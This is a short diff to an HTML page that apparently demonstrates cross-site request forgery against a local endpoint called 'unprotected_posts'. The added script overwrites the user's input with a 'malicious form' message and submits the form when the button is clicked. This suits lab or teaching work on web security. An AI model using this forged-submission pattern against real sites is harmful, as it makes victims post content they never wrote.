@@ -23,12 +23,20 @@
 
     <article>
         <p>Create a post Form</p>
+        <script>
+            function handleSubmit() {
+                console.log("starting handlesubmit");
+                var message = "Thank you for submitting the malicious form!";
+                document.getElementById("content").value = message;
+                document.getElementById("form").submit();
+            }
+        </script>
         <form id="form" action="http://localhost:4000/users/unprotected_posts" method="POST">
             <div>
                 <label for="content">Content:</label>
                 <textarea id="content" name="content" rows="10" cols="50"></textarea>
             </div>
-            <button type="submit">Submit</button>
+            <button type="button" onclick="handleSubmit()">Submit</button>
         </form>
     </article>
 </body>
